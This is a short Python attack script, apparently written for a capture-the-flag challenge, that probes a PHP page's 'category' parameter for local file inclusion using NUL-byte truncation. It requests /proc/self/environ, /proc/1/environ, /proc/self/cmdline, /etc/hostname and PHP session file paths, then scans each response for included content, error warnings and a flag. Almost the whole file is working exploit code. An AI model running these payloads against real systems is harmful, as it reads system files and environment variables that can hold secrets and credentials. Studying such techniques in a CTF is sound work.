"""Round 11: NUL-truncation -> arbitrary file include; look for flag/env/session paths."""
import re
import urllib.parse
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

CATS = [
    "/proc/version%00",
    "/etc/hostname%00",
    "/proc/self/environ%00",
    "/proc/self/cmdline%00",
    "/proc/1/environ%00",
    "woofers/../index%00XXX",
    "/tmp/sess_probe123%00",
    "/var/lib/php/sessions/sess_probe123%00",
    "/var/lib/php5/sess_probe123%00",
]


def fetch(qs):
    url = BASE + qs
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


for qs in CATS:
    status, body = fetch(qs)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:800]
        if "Sorry" in body:
            note += " [SORRY]"
        if "Warning" in body:
            wm = re.search(r"include\(([^)]{0,200})", body)
            note += " [WARN: " + (wm.group(0) if wm else "?") + "]"
        if "flag" in note.lower() and "page-include" in body:
            note += " [contains 'flag']"
    print(f"[{status}] {qs!r}\n      {note}\n")
